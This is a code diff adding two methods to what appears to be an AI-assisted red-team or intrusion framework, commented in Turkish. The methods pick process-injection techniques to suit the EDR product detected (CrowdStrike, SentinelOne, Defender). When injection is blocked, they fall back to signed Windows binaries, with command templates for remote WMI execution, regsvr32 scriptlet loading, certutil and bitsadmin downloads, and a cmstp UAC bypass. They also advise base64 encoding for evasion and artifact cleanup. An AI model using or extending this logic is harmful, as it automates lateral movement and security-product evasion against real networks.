@@ -686,6 +686,244 @@ Be concise and tactical.
             profile["notes"].append("Low anomaly rate - standard profile")
         
         return profile
+    
+    def recommend_lotl_fallback(self, blocked_technique: str, target: str = "") -> Dict[str, Any]:
+        """
+        Injection tekniği engellendiğinde LOTL fallback öner
+        
+        AI: Savunmaya göre otomatik LOTL'ye düş
+        
+        Args:
+            blocked_technique: Engellenen injection tekniği
+            target: Hedef host (opsiyonel)
+        
+        Returns:
+            Dict: LOTL önerisi ve konfigürasyonu
+        """
+        # LOTL bins by stealth and reliability
+        lotl_options = {
+            "wmi": {
+                "stealth": 7,
+                "reliability": 9,
+                "mitre": "T1047",
+                "description": "WMI Process Create - Native Windows",
+                "command_template": 'wmic /node:{target} process call create "{payload}"',
+            },
+            "mshta": {
+                "stealth": 6,
+                "reliability": 8,
+                "mitre": "T1218.005",
+                "description": "HTA execution - Script execution",
+                "command_template": 'mshta.exe javascript:...',
+            },
+            "rundll32": {
+                "stealth": 5,
+                "reliability": 8,
+                "mitre": "T1218.011",
+                "description": "rundll32 execution - DLL/JavaScript",
+                "command_template": 'rundll32.exe shell32.dll,ShellExec_RunDLL ...',
+            },
+            "cmstp": {
+                "stealth": 7,
+                "reliability": 7,
+                "mitre": "T1218.003",
+                "description": "CMSTP INF install - UAC bypass potential",
+                "command_template": 'cmstp.exe /s {inf_file}',
+            },
+            "regsvr32": {
+                "stealth": 6,
+                "reliability": 7,
+                "mitre": "T1218.010",
+                "description": "regsvr32 SCT execution",
+                "command_template": 'regsvr32 /s /n /u /i:{sct_url} scrobj.dll',
+            },
+            "certutil": {
+                "stealth": 5,
+                "reliability": 9,
+                "mitre": "T1140",
+                "description": "certutil download/decode",
+                "command_template": 'certutil -urlcache -split -f {url} {output}',
+            },
+            "bitsadmin": {
+                "stealth": 5,
+                "reliability": 8,
+                "mitre": "T1197",
+                "description": "BITS download",
+                "command_template": 'bitsadmin /transfer job /download /priority high {url} {output}',
+            },
+            "forfiles": {
+                "stealth": 8,
+                "reliability": 6,
+                "mitre": "T1202",
+                "description": "forfiles indirect command execution",
+                "command_template": 'forfiles /p c:\\windows\\system32 /m notepad.exe /c "{command}"',
+            },
+            "pcalua": {
+                "stealth": 8,
+                "reliability": 6,
+                "mitre": "T1202",
+                "description": "pcalua.exe program compatibility assistant",
+                "command_template": 'pcalua.exe -a {payload}',
+            },
+        }
+        
+        # Technique to LOTL mapping (what to use when blocked)
+        fallback_map = {
+            "classic_crt": ["wmi", "forfiles", "pcalua"],
+            "early_bird_apc": ["wmi", "mshta", "cmstp"],
+            "thread_hijack": ["wmi", "rundll32", "regsvr32"],
+            "process_hollowing": ["wmi", "mshta", "certutil"],
+            "module_stomping": ["wmi", "cmstp", "forfiles"],
+            "ghosting": ["wmi", "mshta", "rundll32"],
+            "doppelganging": ["wmi", "cmstp", "pcalua"],
+            "syscall": ["wmi", "forfiles", "mshta"],
+        }
+        
+        recommended_bins = fallback_map.get(blocked_technique, ["wmi", "mshta", "rundll32"])
+        
+        # Build recommendation
+        primary = recommended_bins[0]
+        alternatives = recommended_bins[1:]
+        
+        recommendation = {
+            "reason": f"Injection technique '{blocked_technique}' blocked - falling back to LOTL",
+            "primary": {
+                "name": primary,
+                **lotl_options.get(primary, {})
+            },
+            "alternatives": [
+                {"name": alt, **lotl_options.get(alt, {})}
+                for alt in alternatives
+            ],
+            "target": target,
+            "execution_order": recommended_bins,
+            "guidance": [
+                f"Primary: Use {primary} for execution",
+                f"If {primary} fails, try: {', '.join(alternatives)}",
+                "WMI is generally most reliable for lateral movement",
+                "Consider encoding commands with base64 for evasion",
+            ],
+            "ai_notes": [
+                "LOTL binaries are signed Microsoft tools - less suspicious",
+                "WMI doesn't require file drops on target",
+                "CMSTP can bypass UAC in some scenarios",
+            ],
+        }
+        
+        return recommendation
+    
+    def auto_select_execution_method(self, target: str, edr_detected: str = None,
+                                     blocked_techniques: List[str] = None) -> Dict[str, Any]:
+        """
+        AI: Otomatik execution metodu seç
+        
+        1. Önce process injection dene (stealth order)
+        2. Engellendiyse LOTL'ye düş
+        3. LOTL de engellendiyse alternatif LOTL
+        
+        Args:
+            target: Hedef host
+            edr_detected: Tespit edilen EDR (opsiyonel)
+            blocked_techniques: Engellenen teknikler listesi
+        
+        Returns:
+            Dict: Seçilen metod ve konfigürasyon
+        """
+        blocked_techniques = blocked_techniques or []
+        
+        # Injection techniques by stealth (highest first)
+        injection_order = [
+            ("ghosting", 10),
+            ("doppelganging", 9),
+            ("transacted_hollowing", 9),
+            ("syscall", 9),
+            ("module_stomping", 8),
+            ("early_bird_apc", 8),
+            ("phantom_dll", 8),
+            ("thread_hijack", 7),
+            ("process_hollowing", 6),
+            ("classic_crt", 2),
+        ]
+        
+        # EDR specific adjustments
+        edr_adjustments = {
+            "CrowdStrike": {
+                "avoid": ["classic_crt", "process_hollowing"],
+                "prefer": ["ghosting", "syscall"],
+            },
+            "SentinelOne": {
+                "avoid": ["classic_crt", "thread_hijack"],
+                "prefer": ["doppelganging", "module_stomping"],
+            },
+            "Defender": {
+                "avoid": ["classic_crt"],
+                "prefer": ["early_bird_apc", "syscall"],
+            },
+        }
+        
+        # Filter available techniques
+        available_injection = [
+            (tech, stealth) for tech, stealth in injection_order
+            if tech not in blocked_techniques
+        ]
+        
+        # Apply EDR adjustments
+        if edr_detected and edr_detected in edr_adjustments:
+            adjustments = edr_adjustments[edr_detected]
+            available_injection = [
+                (tech, stealth) for tech, stealth in available_injection
+                if tech not in adjustments.get("avoid", [])
+            ]
+            # Boost preferred techniques
+            for tech, _ in available_injection:
+                if tech in adjustments.get("prefer", []):
+                    available_injection = [(tech, 10)] + [
+                        (t, s) for t, s in available_injection if t != tech
+                    ]
+        
+        # Choose best injection
+        if available_injection:
+            best_injection = available_injection[0][0]
+            return {
+                "method_type": "injection",
+                "technique": best_injection,
+                "stealth": available_injection[0][1],
+                "target": target,
+                "fallback_to_lotl": False,
+                "config": {
+                    "use_syscalls": best_injection in ["syscall", "ghosting", "doppelganging"],
+                    "use_indirect_syscalls": True,
+                },
+            }
+        
+        # All injection blocked - fallback to LOTL
+        lotl_order = ["wmi", "mshta", "cmstp", "rundll32", "regsvr32", "forfiles"]
+        available_lotl = [
+            bin for bin in lotl_order
+            if bin not in blocked_techniques
+        ]
+        
+        if available_lotl:
+            return {
+                "method_type": "lotl",
+                "technique": available_lotl[0],
+                "alternatives": available_lotl[1:3],
+                "target": target,
+                "fallback_to_lotl": True,
+                "reason": "All injection techniques blocked",
+                "config": {
+                    "encode_commands": True,
+                    "cleanup_artifacts": True,
+                },
+            }
+        
+        # Everything blocked - return error
+        return {
+            "method_type": "none",
+            "error": "All execution methods blocked",
+            "target": target,
+            "blocked_count": len(blocked_techniques),
+        }
 
     def suggest_attack_path(self, start: str, goal: str) -> List[Dict]:
         """
